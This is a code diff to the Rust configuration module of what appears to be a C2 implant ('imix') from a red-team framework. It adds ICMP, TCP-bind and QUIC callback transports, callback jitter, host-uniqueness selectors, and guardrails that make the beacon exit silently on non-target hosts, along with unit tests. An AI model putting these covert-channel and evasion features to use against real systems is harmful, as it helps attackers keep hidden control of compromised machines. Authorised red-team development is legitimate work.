@@ -1,4 +1,6 @@
 use anyhow::Context;
+use guardrails::Guardrail;
+use host_unique::HostIDSelector;
 use url::Url;
 use uuid::Uuid;
 
@@ -88,10 +90,14 @@ pub const RUN_ONCE: bool = run_once!();
 fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
     match uri.split(":").next().unwrap_or("unspecified") {
         "dns" => crate::c2::transport::Type::TransportDns,
+        "icmp" => crate::c2::transport::Type::TransportIcmp,
         "http1" => crate::c2::transport::Type::TransportHttp1,
         "https1" => crate::c2::transport::Type::TransportHttp1,
         "https" => crate::c2::transport::Type::TransportGrpc,
         "http" => crate::c2::transport::Type::TransportGrpc,
+        "tcp" => crate::c2::transport::Type::TransportTcpBind,
+        "quic" => crate::c2::transport::Type::TransportQuic,
+        "quics" => crate::c2::transport::Type::TransportQuic,
         _ => crate::c2::transport::Type::TransportUnspecified,
     }
 }
@@ -101,10 +107,11 @@ fn get_transport_type(uri: &str) -> crate::c2::transport::Type {
  * Supports DSN format with query parameters:
  * - interval: callback interval in seconds (overrides default)
  * - extra: extra configuration JSON (overrides default)
+ * - jitter: callback jitter float [0.0, 1.0] (overrides default 0.0)
  *
- * Example: https://example.com?interval=10&extra={"key":"value"}
+ * Example: https://example.com?interval=10&extra={"key":"value"}&jitter=0.5
  */
-fn parse_transports(uri_string: &str) -> Vec<Transport> {
+pub fn parse_transports(uri_string: &str) -> Vec<Transport> {
     uri_string
         .split(';')
         .filter(|s| !s.trim().is_empty())
@@ -119,12 +126,14 @@ fn parse_transports(uri_string: &str) -> Vec<Transport> {
  * Helper function to parse DSN query parameters
  * Returns a Transport struct
  */
-fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
+pub fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
     // Parse as a URL to extract query parameters
     let parsed_url = Url::parse(uri).with_context(|| format!("Failed to parse URI '{}'", uri))?;
 
     let mut interval = parse_callback_interval()?;
     let mut extra = DEFAULT_EXTRA_CONFIG.to_lowercase();
+    let mut jitter = 0.0;
+    let mut transport_type = get_transport_type(uri);
 
     // Parse query parameters
     for (key, value) in parsed_url.query_pairs() {
@@ -137,8 +146,24 @@ fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
             "extra" => {
                 extra = value.to_lowercase();
             }
+            "jitter" => {
+                jitter = value
+                    .parse::<f32>()
+                    .with_context(|| format!("Failed to parse jitter parameter '{}'", value))?;
+            }
+            "type" => {
+                transport_type = match value.to_lowercase().as_str() {
+                    "grpc" => crate::c2::transport::Type::TransportGrpc,
+                    "http1" => crate::c2::transport::Type::TransportHttp1,
+                    "dns" => crate::c2::transport::Type::TransportDns,
+                    "icmp" => crate::c2::transport::Type::TransportIcmp,
+                    "tcp_bind" => crate::c2::transport::Type::TransportTcpBind,
+                    "quic" => crate::c2::transport::Type::TransportQuic,
+                    _ => crate::c2::transport::Type::TransportUnspecified,
+                };
+            }
             _ => {
-                #[cfg(debug_assertions)]
+                #[cfg(feature = "print_debug")]
                 log::debug!("Ignoring unknown query parameter: {}", key);
             }
         }
@@ -151,8 +176,9 @@ fn parse_dsn(uri: &str) -> anyhow::Result<Transport> {
     Ok(Transport {
         uri: base_uri.to_string(),
         interval,
-        r#type: get_transport_type(uri) as i32,
+        r#type: transport_type as i32,
         extra,
+        jitter,
     })
 }
 
@@ -168,6 +194,42 @@ fn parse_callback_interval() -> anyhow::Result<u64> {
     })
 }
 
+fn parse_host_unique_selectors() -> Vec<Box<dyn HostIDSelector>> {
+    let final_res = match option_env!("IMIX_UNIQUE") {
+        Some(json) => {
+            if let Some(res) = host_unique::from_imix_unique(json.to_owned()) {
+                return res;
+            } else {
+                #[cfg(feature = "print_debug")]
+                log::error!(
+                    "Error parsing uniqueness string (should have been caught at build time"
+                );
+                return host_unique::defaults();
+            }
+        }
+        None => host_unique::defaults(),
+    };
+    final_res
+}
+
+fn parse_guardrails() -> Vec<Box<dyn Guardrail>> {
+    let final_res = match option_env!("IMIX_GUARDRAILS") {
+        Some(json) => {
+            if let Some(res) = guardrails::from_imix_guardrails(json.to_owned()) {
+                return res;
+            } else {
+                #[cfg(feature = "print_debug")]
+                log::error!(
+                    "Error parsing guardrails string (should have been caught at build time)"
+                );
+                return guardrails::defaults();
+            }
+        }
+        None => guardrails::defaults(),
+    };
+    final_res
+}
+
 /*
  * Config methods.
  */
@@ -177,7 +239,7 @@ impl Config {
             identifier: format!("imix-v{}", imix_version),
         };
 
-        let selectors = host_unique::defaults();
+        let selectors = parse_host_unique_selectors();
 
         let host = crate::c2::Host {
             name: whoami::fallible::hostname().unwrap_or(String::from("")),
@@ -198,6 +260,13 @@ impl Config {
             transports,
             active_index: 0,
         };
+
+        let guardrails = parse_guardrails();
+        if !guardrails::check_guardrails(guardrails) {
+            #[cfg(feature = "print_debug")]
+            log::error!("Guardrails failed, exiting");
+            std::process::exit(0);
+        }
 
         let info = crate::c2::Beacon {
             identifier: beacon_id,
@@ -225,12 +294,12 @@ impl Config {
                         h.primary_ip = fresh_ip;
                     }
                     None => {
-                        #[cfg(debug_assertions)]
+                        #[cfg(feature = "print_debug")]
                         log::error!("host struct was never initialized, failed to set primary ip");
                     }
                 },
                 None => {
-                    #[cfg(debug_assertions)]
+                    #[cfg(feature = "print_debug")]
                     log::error!("beacon struct was never initialized, failed to set primary ip");
                 }
             }
@@ -276,7 +345,7 @@ fn get_primary_ip() -> String {
             None => String::from(""),
         },
         Err(_err) => {
-            #[cfg(debug_assertions)]
+            #[cfg(feature = "print_debug")]
             log::error!("failed to get primary ip: {_err}");
 
             String::from("")
@@ -303,9 +372,13 @@ mod tests {
         assert_eq!(available.transports.len(), 1);
         assert_eq!(available.active_index, 0);
         // The URL crate normalizes URIs, potentially adding trailing slashes
+        let expected_uri = CALLBACK_URI.split(';').next().unwrap();
+        let parsed_expected = Url::parse(expected_uri).unwrap();
+        let mut expected_base = parsed_expected.clone();
+        expected_base.set_query(None);
         assert!(available.transports[0]
             .uri
-            .starts_with("http://127.0.0.1:8000"));
+            .starts_with(&expected_base.to_string()));
     }
 
     #[test]
@@ -473,6 +546,38 @@ mod tests {
         assert_eq!(
             transports[0].extra,
             r#"{"key":"value","nested":{"foo":"bar"}}"#
+        );
+    }
+
+    #[test]
+    fn test_dsn_with_jitter() {
+        let uris = "https://example.com?jitter=0.5";
+        let transports = parse_transports(uris);
+
+        assert_eq!(transports.len(), 1);
+        assert_eq!(transports[0].uri, "https://example.com/");
+        assert_eq!(transports[0].jitter, 0.5);
+    }
+
+    #[test]
+    fn test_transport_type_detection_quic() {
+        let quic_type = get_transport_type("quic://example.com");
+        assert_eq!(quic_type, crate::c2::transport::Type::TransportQuic);
+
+        let quics_type = get_transport_type("quics://example.com");
+        assert_eq!(quics_type, crate::c2::transport::Type::TransportQuic);
+    }
+
+    #[test]
+    fn test_dsn_with_type_query_param() {
+        let uris = "http://example.com?type=quic";
+        let transports = parse_transports(uris);
+
+        assert_eq!(transports.len(), 1);
+        assert_eq!(transports[0].uri, "http://example.com/");
+        assert_eq!(
+            transports[0].r#type,
+            crate::c2::transport::Type::TransportQuic as i32
         );
     }
 }
